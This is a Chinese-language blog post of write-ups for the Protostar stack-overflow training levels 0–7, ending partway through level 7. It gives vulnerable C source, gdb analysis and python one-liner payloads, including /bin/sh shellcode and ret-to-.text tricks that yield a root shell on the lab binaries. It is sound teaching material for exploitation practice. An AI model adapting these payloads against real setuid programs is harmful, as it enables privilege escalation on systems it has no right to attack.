<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="#Stack ##Stack 0AboutThis level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated me">
<meta name="keywords" content="Exploit,Exercise">
<meta property="og:type" content="article">
<meta property="og:title" content="Exploit Exercises Protostar Stack Write-ups">
<meta property="og:url" content="http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/index.html">
<meta property="og:site_name" content="Jack Pan">
<meta property="og:description" content="#Stack ##Stack 0AboutThis level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated me">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2016-09-16T12:33:44.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Exploit Exercises Protostar Stack Write-ups">
<meta name="twitter:description" content="#Stack ##Stack 0AboutThis level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated me">
    
    
        
          
              <link rel="shortcut icon" href="/favicons/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/favicons/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Exploit Exercises Protostar Stack Write-ups</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Jack Pan" type="application/atom+xml" />
    
</head>

<body class="max-width mx-auto px3">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://github.com/jack0pan">项目</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2014/10/10/Exploit-Exercises-Protostar-Format-Write-ups/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2014/10/08/No-cON-Name-CTF-2014-Quals-Write-up/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&text=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&title=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&is_video=false&description=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Exploit Exercises Protostar Stack Write-ups&body=Check out this article: http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&title=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&title=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&title=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&title=Exploit Exercises Protostar Stack Write-ups"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://jack0pan.github.io/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/&name=Exploit Exercises Protostar Stack Write-ups&description=&lt;p&gt;#Stack&lt;/p&gt;
&lt;p&gt;##Stack 0&lt;br&gt;About&lt;br&gt;This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.&lt;/p&gt;
&lt;p&gt;This level is at /opt/protostar/bin/stack0&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Exploit Exercises Protostar Stack Write-ups
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Jack Pan</span>
      </span>
      
    <div class="postdate">
        <time datetime="2014-10-10T06:55:14.000Z" itemprop="datePublished">2014-10-10</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Exercise/">Exercise</a>, <a class="tag-link" href="/tags/Exploit/">Exploit</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>#Stack</p>
<p>##Stack 0<br>About<br>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.</p>
<p>This level is at /opt/protostar/bin/stack0</p>
<a id="more"></a>
<p>Source code</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];

 modified = 0;
 gets(buffer);

 if(modified != 0) {
  printf(&quot;you have changed the &apos;modified&apos; variable\n&quot;);
 } else {
  printf(&quot;Try again?\n&quot;);
 }
}
</code></pre><p>从源码看，modified在buffer上面，而buffer的size是64，所以只要给buffer值超出64bytes，就可以了，如下：</p>
<pre><code>$python -c &apos;print &quot;A&quot;*68&apos; | ./stack0
you have changed the &apos;modified&apos; variable
</code></pre><p>##Stack 1<br>About<br>This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.</p>
<p>Hints:</p>
<p>If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.<br>Protostar is little endian<br>This level is at /opt/protostar/bin/stack1</p>
<p>Source code</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];

 if(argc == 1) {
  errx(1, &quot;please specify an argument\n&quot;);
 }

 modified = 0;
 strcpy(buffer, argv[1]);

 if(modified == 0x61626364) {
  printf(&quot;you have correctly got the variable to the right value\n&quot;);
 } else {
  printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
 }
}
</code></pre><p>根据源代码，需要将modified修改成0x61626364，提示说“Protostar is little endian”，所以，要将顺序倒过来：</p>
<pre><code>$python -c &apos;print &quot;A&quot;*64+&quot;\x64\x63\x62\x61&quot;&apos;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
</code></pre><p>然后，将以上作为参数运行stack1：</p>
<pre><code>$./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
</code></pre><p>##Stack 2<br>About<br>Stack2 looks at environment variables, and how they can be set.</p>
<p>This level is at /opt/protostar/bin/stack2</p>
<p>Source code</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];
 char *variable;

 variable = getenv(&quot;GREENIE&quot;);

 if(variable == NULL) {
  errx(1, &quot;please set the GREENIE environment variable\n&quot;);
 }

 modified = 0;

 strcpy(buffer, variable);

 if(modified == 0x0d0a0d0a) {
  printf(&quot;you have correctly modified the variable\n&quot;);
 } else {
  printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
 }

}
</code></pre><p>这里是从环境变量GREENIE获取数据，运行前先添加GREENIE，如下：</p>
<pre><code>$ GREENIE=`python -c &apos;print &quot;A&quot;*64+&quot;\x0a\x0d\x0a\x0d&quot;&apos;`
$ ./stack2
you have correctly modified the variable
</code></pre><p>##Stack 3<br>About<br>Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)</p>
<p>Hints:</p>
<p>both gdb and objdump is your friend you determining where the win() function lies in memory.<br>This level is at /opt/protostar/bin/stack3</p>
<p>Source code</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void win()
{
 printf(&quot;code flow successfully changed\n&quot;);
}

int main(int argc, char **argv)
{
 volatile int (*fp)();
 char buffer[64];

 fp = 0;

 gets(buffer);

 if(fp) {
  printf(&quot;calling function pointer, jumping to 0x%08x\n&quot;, fp);
  fp();
 }
}
</code></pre><p>这次我们需要修改fp的值为win()函数的地址，先用gdb加载stack3，然后反汇编win函数，如下：</p>
<pre><code>(gdb) disassemble win
Dump of assembler code for function win:
0x08048424 &lt;win+0&gt;:     push   %ebp
0x08048425 &lt;win+1&gt;:     mov    %esp,%ebp
0x08048427 &lt;win+3&gt;:     sub    $0x18,%esp
0x0804842a &lt;win+6&gt;:     movl   $0x8048540,(%esp)
0x08048431 &lt;win+13&gt;:    call   0x8048360 &lt;puts@plt&gt;
0x08048436 &lt;win+18&gt;:    leave
0x08048437 &lt;win+19&gt;:    ret
End of assembler dump.
</code></pre><p>得到win函数的地址为0x08048424，命令如下：</p>
<pre><code>$python -c &apos;print &quot;A&quot;*64+&quot;\x24\x84\x04\x08&quot;&apos; | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
</code></pre><p>##Stack 4<br>About<br>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.</p>
<p>Hints:</p>
<p>A variety of introductory papers into buffer overflows may help.<br>gdb lets you do “run &lt; input”<br>EIP is not directly after the end of buffer, compiler padding can also increase the size.<br>This level is at /opt/protostar/bin/stack4</p>
<p>Source code</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void win()
{
 printf(&quot;code flow successfully changed\n&quot;);
}

int main(int argc, char **argv)
{
 char buffer[64];

 gets(buffer);
}
</code></pre><p>首先，gdb调试stack4，进入后，反汇编main函数：</p>
<pre><code>(gdb) disas main
Dump of assembler code for function main:
0x08048408 &lt;main+0&gt;:    push   %ebp
0x08048409 &lt;main+1&gt;:    mov    %esp,%ebp
0x0804840b &lt;main+3&gt;:    and    $0xfffffff0,%esp
0x0804840e &lt;main+6&gt;:    sub    $0x50,%esp
0x08048411 &lt;main+9&gt;:    lea    0x10(%esp),%eax
0x08048415 &lt;main+13&gt;:   mov    %eax,(%esp)
0x08048418 &lt;main+16&gt;:   call   0x804830c &lt;gets@plt&gt;
0x0804841d &lt;main+21&gt;:   leave
0x0804841e &lt;main+22&gt;:   ret
End of assembler dump.
</code></pre><p>在main+21处加断点：</p>
<pre><code>(gdb) break *main+21
Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
</code></pre><p>执行，然后输入<code>aaaaaaaaaa</code>：</p>
<pre><code>(gdb) run
Starting program: /opt/protostar/bin/stack4
aaaaaaaaaa

Breakpoint 1, main (argc=1, argv=0xbffffcd4) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
    in stack4/stack4.c
</code></pre><p>从栈顶开始查看，得到buffer的位置是<code>0xbffffbe0</code>：</p>
<pre><code>(gdb) x/80xw $esp
0xbffffbd0:     0xbffffbe0      0xb7ec6165      0xbffffbe8      0xb7eada75
0xbffffbe0:     0x61616161      0x61616161      0xbf006161      0x080482e8
0xbffffbf0:     0xb7ff1040      0x080495ec      0xbffffc28      0x08048449
0xbffffc00:     0xb7fd8304      0xb7fd7ff4      0x08048430      0xbffffc28
0xbffffc10:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff4
0xbffffc20:     0x08048430      0x00000000      0xbffffca8      0xb7eadc76
0xbffffc30:     0x00000001      0xbffffcd4      0xbffffcdc      0xb7fe1848
0xbffffc40:     0xbffffc90      0xffffffff      0xb7ffeff4      0x0804824b
0xbffffc50:     0x00000001      0xbffffc90      0xb7ff0626      0xb7fffab0
0xbffffc60:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffffc70:     0xbffffca8      0xd824b630      0xf264a020      0x00000000
0xbffffc80:     0x00000000      0x00000000      0x00000001      0x08048340
0xbffffc90:     0x00000000      0xb7ff6210      0xb7eadb9b      0xb7ffeff4
0xbffffca0:     0x00000001      0x08048340      0x00000000      0x08048361
0xbffffcb0:     0x08048408      0x00000001      0xbffffcd4      0x08048430
0xbffffcc0:     0x08048420      0xb7ff1040      0xbffffccc      0xb7fff8f8
0xbffffcd0:     0x00000001      0xbffffde3      0x00000000      0xbffffdfd
0xbffffce0:     0xbffffe07      0xbffffe29      0xbffffe3d      0xbffffe4d
0xbffffcf0:     0xbffffe5f      0xbffffe72      0xbffffebe      0xbfffff0b
0xbffffd00:     0xbfffff18      0xbfffff24      0xbfffff2f      0xbfffff6d
</code></pre><p>返回地址存放在ebp+4处，所以算一下此处到buffer起始位置的长度：</p>
<pre><code>(gdb) p $ebp+4-0xbffffbe0
$1 = (void *) 0x4c
</code></pre><p>最后得到一下命令：</p>
<pre><code>$python -c &apos;print &quot;A&quot;*76+&quot;\xf4\x83\x04\x08&quot;&apos; | ./stack4
code flow successfully changed
</code></pre><p>##Stack 5<br>About<br>Stack5 is a standard buffer overflow, this time introducing shellcode.</p>
<p>Hints:</p>
<p>At this point in time, it might be easier to use someone elses shellcode<br>If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger<br>remove the int3s once your shellcode is done.<br>This level is at /opt/protostar/bin/stack5</p>
<p>Source code</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv)
{
 char buffer[64];

 gets(buffer);
}
</code></pre><p>根据上面，我们构造如下exploit代码：</p>
<pre><code>python -c &apos;print &quot;A&quot;*76+&quot;\x40\xfc\xff\xbf&quot;+&quot;\x90&quot;*16+&quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;&apos; | ./stack5
</code></pre><p>运行后提示<code>Segmentation fault</code>，可能原因是gdb看到的地址跟实际执行的不一样，这里只能分析core dump来得到正确的地址。</p>
<pre><code>$ulimit -c unlimited #不限制core文件的大小
$cat /proc/sys/kernel/core_pattern #查看core文件位置与格式
/tmp/core.%s.%e.%p
#echo 1 &gt;/proc/sys/fs/suid_dumpable #设置生成core文件
</code></pre><p>重新运行exploit代码：</p>
<pre><code>$python -c &apos;print &quot;A&quot;*76+&quot;\x40\xfc\xff\xbf&quot;+&quot;\x90&quot;*16+&quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;&apos; | ./stack5
(Segmentation fault (core dumped))
</code></pre><p>查看dump文件：</p>
<pre><code>$ ls /tmp/
core.11.stack5.1868
</code></pre><p>使用gdb分析core文件：</p>
<pre><code># gdb -q -c /tmp/core.11.stack5.1868
Core was generated by `./stack5&apos;.
Program terminated with signal 11, Segmentation fault.
#0  0xbffffe18 in ?? ()
(gdb) x/40xw $esp-100
0xbffffcac:     0x080483d9      0xbffffcc0      0xb7ec6165      0xbffffcc8
0xbffffcbc:     0xb7eada75      0x01413db6      0x41414141      0x41414141
0xbffffccc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcdc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcec:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcfc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd0c:     0xbffffe10      0x90909090      0x90909090      0xc0319090
0xbffffd1c:     0x06b0db31      0x685380cd      0x7974742f      0x65642f68
0xbffffd2c:     0x31e38976      0x12b966c9      0xcd05b027      0x50c03180
0xbffffd3c:     0x732f2f68      0x622f6868      0xe3896e69      0xe1895350
</code></pre><p>所以新的返回地址应该是<code>0xbffffd10</code>，如下：</p>
<pre><code>$python -c &apos;print &quot;A&quot;*76 + &quot;\x10\xfd\xff\xbf&quot; + &quot;\x90&quot;*10 + &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;&apos; | ./stack5
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</code></pre><p>##Stack 6<br>About<br>Stack6 looks at what happens when you have restrictions on the return address.</p>
<p>This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.</p>
<p>It is strongly suggested you experiment with multiple ways of getting your code to execute here.</p>
<p>This level is at /opt/protostar/bin/stack6</p>
<p>Source code</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void getpath()
{
        char buffer[64];
        unsigned int ret;

        printf(&quot;input path please: &quot;); fflush(stdout);

        gets(buffer);

        ret = __builtin_return_address(0);

        if((ret &amp; 0xbf000000) == 0xbf000000) {
                printf(&quot;bzzzt (%p)\n&quot;, ret);
                _exit(1);
        }

        printf(&quot;got path %s\n&quot;, buffer);
}

int main(int argc, char **argv)
{
        getpath();



}
</code></pre><p>根据提示，此题有三种解法，这里只介绍一种。</p>
<p>1、finding the duplicate of the payload<br>此方法暂时不知道。</p>
<p>2、ret2libc<br>shellcode构造一般思路是：</p>
<pre><code>address of system() + address of exit() + address of command
</code></pre><p>但这里有个问题，用<code>system()</code>执行命令时会“drop root privileges”，所以用这个无法直接获取有root权限的shell，这里就不尝试了。</p>
<p>3、return orientated programming<br>先反汇编<code>getpath</code>：</p>
<pre><code>(gdb) disas getpath
Dump of assembler code for function getpath:
0x08048484 &lt;getpath+0&gt;: push   %ebp
0x08048485 &lt;getpath+1&gt;: mov    %esp,%ebp
0x08048487 &lt;getpath+3&gt;: sub    $0x68,%esp
0x0804848a &lt;getpath+6&gt;: mov    $0x80485d0,%eax
0x0804848f &lt;getpath+11&gt;:        mov    %eax,(%esp)
0x08048492 &lt;getpath+14&gt;:        call   0x80483c0 &lt;printf@plt&gt;
0x08048497 &lt;getpath+19&gt;:        mov    0x8049720,%eax
0x0804849c &lt;getpath+24&gt;:        mov    %eax,(%esp)
0x0804849f &lt;getpath+27&gt;:        call   0x80483b0 &lt;fflush@plt&gt;
0x080484a4 &lt;getpath+32&gt;:        lea    -0x4c(%ebp),%eax
0x080484a7 &lt;getpath+35&gt;:        mov    %eax,(%esp)
0x080484aa &lt;getpath+38&gt;:        call   0x8048380 &lt;gets@plt&gt;
0x080484af &lt;getpath+43&gt;:        mov    0x4(%ebp),%eax
0x080484b2 &lt;getpath+46&gt;:        mov    %eax,-0xc(%ebp)
0x080484b5 &lt;getpath+49&gt;:        mov    -0xc(%ebp),%eax
0x080484b8 &lt;getpath+52&gt;:        and    $0xbf000000,%eax
0x080484bd &lt;getpath+57&gt;:        cmp    $0xbf000000,%eax
0x080484c2 &lt;getpath+62&gt;:        jne    0x80484e4 &lt;getpath+96&gt;
0x080484c4 &lt;getpath+64&gt;:        mov    $0x80485e4,%eax
0x080484c9 &lt;getpath+69&gt;:        mov    -0xc(%ebp),%edx
0x080484cc &lt;getpath+72&gt;:        mov    %edx,0x4(%esp)
0x080484d0 &lt;getpath+76&gt;:        mov    %eax,(%esp)
0x080484d3 &lt;getpath+79&gt;:        call   0x80483c0 &lt;printf@plt&gt;
0x080484d8 &lt;getpath+84&gt;:        movl   $0x1,(%esp)
0x080484df &lt;getpath+91&gt;:        call   0x80483a0 &lt;_exit@plt&gt;
0x080484e4 &lt;getpath+96&gt;:        mov    $0x80485f0,%eax
0x080484e9 &lt;getpath+101&gt;:       lea    -0x4c(%ebp),%edx
0x080484ec &lt;getpath+104&gt;:       mov    %edx,0x4(%esp)
0x080484f0 &lt;getpath+108&gt;:       mov    %eax,(%esp)
0x080484f3 &lt;getpath+111&gt;:       call   0x80483c0 &lt;printf@plt&gt;
0x080484f8 &lt;getpath+116&gt;:       leave
0x080484f9 &lt;getpath+117&gt;:       ret
End of assembler dump.
</code></pre><p>先记下ret的地址<code>0x080484f9</code>，然后运行一下代码：</p>
<pre><code>$python -c &apos;print &quot;A&quot;*80+&quot;B&quot;*4&apos; | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB
Segmentation fault (core dumped)
</code></pre><p>用gdb调试：</p>
<pre><code># gdb -q -c /tmp/core.11.stack6.2180
Core was generated by `./stack6&apos;.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
(gdb) x/40xw $esp-100
0xbffffc9c:     0x00000001      0x00000000      0x00000001      0xb7fff8f8
0xbffffcac:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcbc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffccc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcdc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcec:     0x42424242      0x41414141      0x41414141      0x41414141
0xbffffcfc:     0x42424242      0x08048500      0x00000000      0xbffffd88
0xbffffd0c:     0xb7eadc76      0x00000001      0xbffffdb4      0xbffffdbc
0xbffffd1c:     0xb7fe1848      0xbffffd70      0xffffffff      0xb7ffeff4
0xbffffd2c:     0x080482a1      0x00000001      0xbffffd70      0xb7ff0626
</code></pre><p>将前面的ret地址放在<code>0xbffffcfc</code>处，后面放shellcode的地址，再后面就是shellcode：</p>
<pre><code>$python -c &apos;print &quot;A&quot;*80 + &quot;\xf9\x84\x04\x08&quot;+ &quot;\x04\xfd\xff\xbf&quot; + &quot;\x90&quot;*10 + &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;&apos; | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒▒▒▒▒▒▒▒▒▒1▒1۰̀Sh/ttyh/dev▒▒1▒f▒&apos;▒̀1▒Ph//shh/bin▒▒PS▒ᙰ
                                                          ̀
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</code></pre><p>##Stack 7<br>About<br>Stack6 introduces return to .text to gain code execution.</p>
<p>The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.</p>
<p>This level is at /opt/protostar/bin/stack7</p>
<p>Source code</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

char *getpath()
{
 char buffer[64];
 unsigned int ret;

 printf(&quot;input path please: &quot;); fflush(stdout);

 gets(buffer);

 ret = __builtin_return_address(0);

 if((ret &amp; 0xb0000000) == 0xb0000000) {
  printf(&quot;bzzzt (%p)\n&quot;, ret);
  _exit(1);
 }

 printf(&quot;got path %s\n&quot;, buffer);
 return strdup(buffer);
}

int main(int argc, char **argv)
{
 getpath();



}
</code></pre><p>先反汇编，看一下getpath函数：</p>
<pre><code>(gdb) disas getpath
Dump of assembler code for function getpath:
0x080484c4 &lt;getpath+0&gt;: push   %ebp
0x080484c5 &lt;getpath+1&gt;: mov    %esp,%ebp
0x080484c7 &lt;getpath+3&gt;: sub    $0x68,%esp
0x080484ca &lt;getpath+6&gt;: mov    $0x8048620,%eax
0x080484cf &lt;getpath+11&gt;:        mov    %eax,(%esp)
0x080484d2 &lt;getpath+14&gt;:        call   0x80483e4 &lt;printf@plt&gt;
0x080484d7 &lt;getpath+19&gt;:        mov    0x8049780,%eax
0x080484dc &lt;getpath+24&gt;:        mov    %eax,(%esp)
0x080484df &lt;getpath+27&gt;:        call   0x80483d4 &lt;fflush@plt&gt;
0x080484e4 &lt;getpath+32&gt;:        lea    -0x4c(%ebp),%eax
0x080484e7 &lt;getpath+35&gt;:        mov    %eax,(%esp)
0x080484ea &lt;getpath+38&gt;:        call   0x80483a4 &lt;gets@plt&gt;
0x080484ef &lt;getpath+43&gt;:        mov    0x4(%ebp),%eax
0x080484f2 &lt;getpath+46&gt;:        mov    %eax,-0xc(%ebp)
0x080484f5 &lt;getpath+49&gt;:        mov    -0xc(%ebp),%eax
0x080484f8 &lt;getpath+52&gt;:        and    $0xb0000000,%eax
0x080484fd &lt;getpath+57&gt;:        cmp    $0xb0000000,%eax
0x08048502 &lt;getpath+62&gt;:        jne    0x8048524 &lt;getpath+96&gt;
0x08048504 &lt;getpath+64&gt;:        mov    $0x8048634,%eax
0x08048509 &lt;getpath+69&gt;:        mov    -0xc(%ebp),%edx
0x0804850c &lt;getpath+72&gt;:        mov    %edx,0x4(%esp)
0x08048510 &lt;getpath+76&gt;:        mov    %eax,(%esp)
0x08048513 &lt;getpath+79&gt;:        call   0x80483e4 &lt;printf@plt&gt;
0x08048518 &lt;getpath+84&gt;:        movl   $0x1,(%esp)
0x0804851f &lt;getpath+91&gt;:        call   0x80483c4 &lt;_exit@plt&gt;
0x08048524 &lt;getpath+96&gt;:        mov    $0x8048640,%eax
0x08048529 &lt;getpath+101&gt;:       lea    -0x4c(%ebp),%edx
0x0804852c &lt;getpath+104&gt;:       mov    %edx,0x4(%esp)
0x08048530 &lt;getpath+108&gt;:       mov    %eax,(%esp)
0x08048533 &lt;getpath+111&gt;:       call   0x80483e4 &lt;printf@plt&gt;
0x08048538 &lt;getpath+116&gt;:       lea    -0x4c(%ebp),%eax
0x0804853b &lt;getpath+119&gt;:       mov    %eax,(%esp)
0x0804853e &lt;getpath+122&gt;:       call   0x80483f4 &lt;strdup@plt&gt;
0x08048543 &lt;getpath+127&gt;:       leave
0x08048544 &lt;getpath+128&gt;:       ret
End of assembler dump.
</code></pre><p>在getpath+46行，将eax的值存到（ebp-0xc）处，而eax值为buffer的地址，所以在执行call eax后，会执行buffer中的之类，所以要在（ebp-0xc）前加jmp指令。</p>
<p>先来取call eax指令的地址，这里使用objdump命令，如下：</p>
<pre><code>$ objdump -D stack7 | grep &apos;call&apos;
804835b:       e8 00 00 00 00          call   8048360 &lt;_init+0xc&gt;
8048371:       e8 1e 00 00 00          call   8048394 &lt;__gmon_start__@plt&gt;
8048376:       e8 25 01 00 00          call   80484a0 &lt;frame_dummy&gt;
804837b:       e8 50 02 00 00          call   80485d0 &lt;__do_global_ctors_aux&gt;
